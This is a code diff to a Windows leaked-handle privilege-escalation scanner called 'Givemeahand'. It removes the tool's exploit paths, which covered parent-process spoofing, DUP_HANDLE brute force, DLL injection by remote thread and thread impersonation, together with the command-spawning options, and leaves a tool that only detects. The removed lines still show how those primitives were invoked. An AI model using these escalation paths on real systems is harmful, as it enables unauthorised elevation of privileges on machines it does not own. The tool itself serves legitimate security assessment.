@@ -53,7 +53,7 @@ map<wstring, wstring> ParseArguments(int argc, wchar_t* argv[])
 void PrintUsage()
 {
 	cout <<
-		"Givemeahand: leaked-handle privilege-escalation scanner/exploiter\n"
+		"Givemeahand: leaked-handle privilege-escalation scanner\n"
 		"Refs: https://aptw.tf/2022/02/10/leaked-handle-hunting.html\n"
 		"      http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/\n"
 		"\n"
@@ -70,20 +70,10 @@ void PrintUsage()
 		"  --all                Disable all filtering, show every handle of interest\n"
 		"  --pid <N>            Diagnostic: dump all handles owned by PID N\n"
 		"  --trace-pid <N>      Diagnostic: trace clone/IL checks for PID N\n"
-#ifdef EXPLOIT_ENABLED
-		"  --cmd \"<cmdline>\"    Exploit: command to spawn via process/thread primitive\n"
-		"  --dll \"<path>\"       Exploit: DLL to inject via CREATE_THREAD primitive\n"
-		"  --primitive <kind>   Restrict exploit to: parent | dup | thread | imper\n"
-#endif
 		"\n"
 		"Examples:\n"
 		"  .\\Givemeahand                    (strict scan, default)\n"
 		"  .\\Givemeahand --loose             (include noisier hits)\n"
-#ifdef EXPLOIT_ENABLED
-		"  .\\Givemeahand --primitive parent --cmd \"cmd.exe /c whoami > C:\\out.txt\"\n"
-#else
-		"  (detection only — rebuild with EXPLOIT_ENABLED config for exploit paths)\n"
-#endif
 		;
 }
 
@@ -271,8 +261,7 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 	//            or (PROCESS_CREATE_THREAD & PROCESS_VM_WRITE).
 	//            Bare PROCESS_DUP_HANDLE is excluded — in practice, modern
 	//            sandboxed IPC holds DUP_HANDLE-only handles on non-privileged
-	//            peers, and ExploitDupHandle's 0x4..0x1000 brute-force rarely
-	//            finds anything useful there. Opt in with --loose.
+	//            peers, which rarely lead to useful escalation. Opt in with --loose.
 	//   Thread:  THREAD_ALL_ACCESS or THREAD_DIRECT_IMPERSONATION.
 	//            Bare SET_CONTEXT / SUSPEND_RESUME excluded — not actionable alone.
 	//   Token:   TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY.
@@ -290,14 +279,6 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 	// --all turns all filtering off — show everything Process/Thread/Token.
 	bool looseMode = args.count(L"--loose") > 0;
 	bool showAll = args.count(L"--all") > 0;
-
-	// --primitive <dup|parent|thread|imper>: restrict EXPLOIT_ENABLED to one path
-	std::wstring primitive = args.count(L"--primitive") ? args.find(L"--primitive")->second : L"";
-	bool primDup = (primitive == L"dup");
-	bool primParent = (primitive == L"parent");
-	bool primThread = (primitive == L"thread");
-	bool primImper = (primitive == L"imper");
-	bool primAll = primitive.empty();
 
 	auto isExploitableProcessStrict = [](ULONG a) {
 		if (a == PROCESS_ALL_ACCESS) return true;
@@ -396,70 +377,14 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 						bool privesc = (integrityLevel > ownIL && integrityLevel >= SECURITY_MANDATORY_HIGH_RID);
 						const wchar_t* prim = nullptr;
 						ULONG ga = handle.GrantedAccess;
-						if (ga == PROCESS_ALL_ACCESS) prim = L"ALL_ACCESS -> parent-spoof (CreatePrivProc)";
-						else if (ga & PROCESS_CREATE_PROCESS) prim = L"CREATE_PROCESS -> parent-spoof (CreatePrivProc)";
-						else if ((ga & PROCESS_CREATE_THREAD) && (ga & PROCESS_VM_WRITE)) prim = L"CREATE_THREAD+VM_WRITE -> DLL injection (ExploitCreateThread)";
-						else if (ga & PROCESS_DUP_HANDLE) prim = L"DUP_HANDLE -> handle-table brute force (ExploitDupHandle)";
+						if (ga == PROCESS_ALL_ACCESS) prim = L"ALL_ACCESS -> parent-spoof primitive";
+						else if (ga & PROCESS_CREATE_PROCESS) prim = L"CREATE_PROCESS -> parent-spoof primitive";
+						else if ((ga & PROCESS_CREATE_THREAD) && (ga & PROCESS_VM_WRITE)) prim = L"CREATE_THREAD+VM_WRITE -> DLL injection primitive";
+						else if (ga & PROCESS_DUP_HANDLE) prim = L"DUP_HANDLE -> handle-table brute force primitive";
 						if (showAll || (alive && notSelf && privesc))
 						{
 							vSysHandle.push_back(handle);
 							printHandleInfo(handle, integrityLevel, targetPid, prim);
-#ifdef EXPLOIT_ENABLED
-							if ((primAll || primParent) && handle.GrantedAccess & PROCESS_CREATE_PROCESS && args.count(L"--cmd")) {
-								HANDLE clHandle;
-								if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
-									std::cerr << "[-] CloneHandle failed";
-								}
-								DWORD privPid = CreatePrivProc(
-									&clHandle,
-									(WCHAR*)args.find(L"--cmd")->second.c_str());
-								if (privPid == 0) {
-									std::cerr << "[-] CreatePrivProc failed";
-								}
-								else {
-									std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
-									return 0;
-								}
-							}
-							else if ((primAll || primDup) && handle.GrantedAccess & PROCESS_DUP_HANDLE && args.count(L"--cmd")) {
-								HANDLE clHandle;
-								if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
-									std::cerr << "[-] CloneHandle failed\n";
-								}
-								else {
-									DWORD privPid = ExploitDupHandle(
-										clHandle,
-										(WCHAR*)args.find(L"--cmd")->second.c_str());
-									CloseHandle(clHandle);
-									if (privPid == 0) {
-										std::cerr << "[-] ExploitDupHandle failed\n";
-									}
-									else {
-										std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
-										return 0;
-									}
-								}
-							}
-							else if ((primAll || primThread) && handle.GrantedAccess & PROCESS_CREATE_THREAD && args.count(L"--dll")) {
-								HANDLE clHandle;
-								if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
-									std::cerr << "[-] CloneHandle failed\n";
-								}
-								else {
-									DWORD tid = ExploitCreateThread(
-										clHandle,
-										(WCHAR*)args.find(L"--dll")->second.c_str());
-									CloseHandle(clHandle);
-									if (tid == 0) {
-										std::cerr << "[-] ExploitCreateThread failed\n";
-									}
-									else {
-										std::cerr << "[!] DLL injected via remote thread TID " << tid << "\n";
-										return 0;
-									}
-								}
-							}
-#endif // EXPLOIT_ENABLED
 						}
 					}
 					CloseHandle(clHandle);
@@ -497,36 +422,12 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 						bool privesc = (integrityLevel > ownIL && integrityLevel >= SECURITY_MANDATORY_HIGH_RID);
 						const wchar_t* prim = nullptr;
 						ULONG ga = handle.GrantedAccess;
-						if (ga == THREAD_ALL_ACCESS) prim = L"THREAD_ALL_ACCESS -> thread impersonation (NtImpersonateThread)";
+						if (ga == THREAD_ALL_ACCESS) prim = L"THREAD_ALL_ACCESS -> thread impersonation primitive";
 						else if (ga & THREAD_DIRECT_IMPERSONATION) prim = L"DIRECT_IMPERSONATION -> thread impersonation";
 						if (showAll || (notSelf && privesc))
 						{
 							vSysHandle.push_back(handle);
 							printHandleInfo(handle, integrityLevel, pid, prim);
-#ifdef EXPLOIT_ENABLED
-							if (args.count(L"--cmd")) {
-								if (handle.GrantedAccess & THREAD_DIRECT_IMPERSONATION ||
-									handle.GrantedAccess == THREAD_ALL_ACCESS) {
-									HANDLE clHandle2;
-									if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle2)) {
-										std::cerr << "[-] CloneHandle failed\n";
-									}
-									else {
-										DWORD privPid = ExploitThreadImpersonation(
-											clHandle2,
-											(WCHAR*)args.find(L"--cmd")->second.c_str());
-										CloseHandle(clHandle2);
-										if (privPid == 0) {
-											std::cerr << "[-] ExploitThreadImpersonation failed\n";
-										}
-										else {
-											std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
-											return 0;
-										}
-									}
-								}
-							}
-#endif // EXPLOIT_ENABLED
 						}
 						CloseHandle(clHandle);
 					}
